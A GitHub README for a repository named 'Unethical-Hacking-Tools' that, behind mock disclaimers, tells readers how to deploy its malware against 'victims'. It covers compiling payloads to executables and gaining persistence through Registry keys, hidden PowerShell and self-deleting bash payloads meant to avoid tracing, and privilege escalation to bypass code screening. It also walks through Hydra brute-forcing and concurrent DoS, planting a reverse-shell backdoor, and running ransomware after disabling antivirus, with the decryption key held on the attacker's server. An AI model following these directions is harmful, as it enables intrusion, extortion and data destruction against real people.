# Unethical-Hacking-Tools
![Ethical Hacking](https://t3.ftcdn.net/jpg/02/04/94/58/360_F_204945831_yzvd0Ult5kS5yjXDUjoHxMgUCE63KKf9.jpg)
![V for vendetta](https://m.media-amazon.com/images/M/MV5BMjAxNTE4NTcxNl5BMl5BanBnXkFtZTcwNTk0MTYyNw@@._V1_.jpg)
##
## Disclaimer
## !!!! This repo does NOT encourage unethical hacktivism !!!!!!
## !!!! My Cybersecurity Mentor Jimmy did NOT teach me this !!!!
## 
## This repo is for learning & professional development purposes
## If you do NOT follow rules below, YOU GO TO JAIL ;)
## 
## Rule 1:
## Ask your victims for permissions before doing any of these
##
## Rule 2:
## Do NOT launch these shit without black & white permissions
## 
## Rule 3:
## Do NOT get addicted to these crazy shit
##
## Please ONLY run these scripts on your victims, NOT your good selves...
##
## Best Practices for compiling malware to .exe:
##
## Approach 1 Use Python compiler pyinstaller
## python -m pyinstall single.py --onefile --noconsole;
## Reside the only .exe to your targets
## Gain persistency using Registry keys in Windows
##
##
## Approach 2 Use Python compiler cx_Freeze
## Reside the .exe & .dll to your targets
## Gain persistency using Registry keys in Windows
## 
## Installing cx_Freeze
## python -m pip install cx_Freeze --user IGS;
##
## Compiling a single .py file:
## python -m cx_Freeze single.py;
##
##
## Approach 3
## Fileless hacking
## Launching all these crazy shit using encrypted SSH tunnels
## 
## Encapsulate these maliacious payloads on Windows/ Linux using: 
## Fileless malicious payloads
## Windows => open cmd.exe:
## cmd terminal type:
## Powershell.exe -windowStyle hidden -command "line1; line2; line3; line4"
##
## Linux:
## Bash terminal:
## printf "import time, rotatescreen as rs\npd = rs.get_primary_display()\nangle_list = [0, 90, 180, 270, 90, 180, 90, 270]\nwhile True:\n\tfor i in range(5):\n\t\tfor x in angle_list:\n\t\t\tpd.rotate_to(x)\n\t\t\ttime.sleep(0.5)" > virus.py &&
## python ./virus.py &&
## rm -rf ./virus.py
## 
## Approach 4
## Grab an Ansible Tower => Enumerate a user with careless saved password for Privilege Escalation => using "commands" entry to bypass artifactory code screening with using a playbook
## Send Fileless malicious payloads
## Windows => open cmd.exe:
## cmd terminal type:
## Powershell.exe -windowStyle hidden -command "line1; line2; line3; line4"
##
## Linux:
## Bash terminal:
## printf "import time, rotatescreen as rs\npd = rs.get_primary_display()\nangle_list = [0, 90, 180, 270, 90, 180, 90, 270]\nwhile True:\n\tfor i in range(5):\n\t\tfor x in angle_list:\n\t\t\tpd.rotate_to(x)\n\t\t\ttime.sleep(0.5)" > virus.py &&
## python ./virus.py &&
## rm -rf ./virus.py
##
## Thus, no one can easily trace what the heck you did to them
##
## If you persist doing these crazy shit without formal permissions
## I hope you do NOT get caught & go to jail...
##
## Do NOT blame this repository owner
## This repository owner NEVER suggests hacktivism
## This repository owner suggests continuous learning & defending by mimicking why & how malicious hackers portrait their skills
##
## ================= Usage ===================
## Usage
## Install Kali Linux
## https://www.kali.org/
## If you have a Networking background
## Download => Virtual Machines
## Select your Virtualization environment
## VMware / VirtualBox / Hyper-V
## Get ISO images 
## https://www.kali.org/get-kali/#kali-installer-images
##
## If you have a Programming background
## get Containers (Docker/LXC/LXD) 
## https://www.kali.org/get-kali/#kali-containers
## apt update && apt -y install kali-linux-headless
## apt update && apt -y install kali-linux-large
## docker pull kalilinux/kali-rolling
##
## ================== Kali Linux ================
## Upon fresh installation of an ISO image on VMware
## You need to update && upgrade Kali repository
##
## Step 1 Update expired Kali keys on base-build image
## sudo wget https://archive.kali.org/archive-key.asc -O /etc/apt/trusted.gpg.d/kali-archive-keyring.asc;
## 
## Step 2 Update Kali.org Repository to start using HTTPS
## sudo vim /etc/apt/sources.list;
## 
## Step 3 APT update & upgrade
## sudo apt update && apt -y upgrade;
## 
## Step 4 Clean up APT after updating & upgrading to Kali repo
## sudo apt autoremove -y;
## 
## ================== Brute-forcing + Concurrent DoS using Bash  ====================
![The Other Side of the Sea](https://i.ytimg.com/vi/oHcx1QLOJ3U/maxresdefault.jpg)
##
![The Rumbling](https://i.ytimg.com/vi/oHcx1QLOJ3U/maxresdefault.jpg)
## Use Bash scripts in ./Malware-Dev/Brute-force
## Install apt dependencies
## chmod +x ./install.sh && bash install.sh;
## 
## Brute-forcing with Hydra
## Edit hydra.sh OR 1n3sniper.sh
## Edit the namelists & wordlists used for hydra
## Edit the namelists & wordlists used for 1N3/Sn1per
## 
## Multiplexing your Brute-forcing scripts using TMUX
## Edit scripts path & session number for concurrent attacks
## in fire-superiority-hydra.sh && fire-superiority-sniper.sh
## 
## Best Practices
## You should only do
## bash fire-superiorty-hydra.sh
## once at a given time to avoid crashing your Kali Linux
## Aim well & make it count ;)
## 
## ================== Python ====================
## Usage
## Python Dependencies
## bash install-modules.sh
##
## ============================================
## Backdoor
## Victims' machines:
## Use your creativity to find the way to run code in reverse_shell.py
##
## Backdoor Server:
## Use your creativity to host server.py in somewhere safe ;)
## 
## ============================================
## Ransomware:
##
## On Victim's machine => Disable Virus & threat protection
## Edit settings => Disable all
## 
## Or you may research the theory on how files' metadata hash is
## used in anti-virus scanning virus & 
## Create your own way to bypass Anti-virus e.g. Checkpoint ;)
## https://usa.kaspersky.com/resource-center/threats/combating-antivirus
##
##
## cd Unethical-Hacking-Tools &&
## Edit the listening server IP in server.py in line 11 
## to your attacker machine IP
## 
## Run the server.py to start listening
## python ./Ransomware/server.py;
##
## On your victim's machine 
## Edit the IP_ADDRESS in line 109 to attacker's machine IP
## run encryption.py code by whatever malicious means you can imagine
## 
## Go back to your attacker's machine
## Check out encrypted_hosts.txt for decryption key
##
## On victim's machine, run decryption.py code by whatever means
## Enter the decryption key in 'encrypted_hosts.txt' 
## to decrypt the locked files
##
## You may change the path for encryption where the encryption script runs at
##
## ============================================
##
## Never store this kind of stuff on your/your victims PCs
## Otherwise, you go to jail...
##
## Bash
## sudo python -m pip install rotate-screen --user root &&
## cd tempDir &&
## 
## echo "pythonCode" > *.py &
##
## Please proceed with extra due care & sincerity
##
## Enjoy :D
##
## git clone <.git>
## sudo python3 *.py
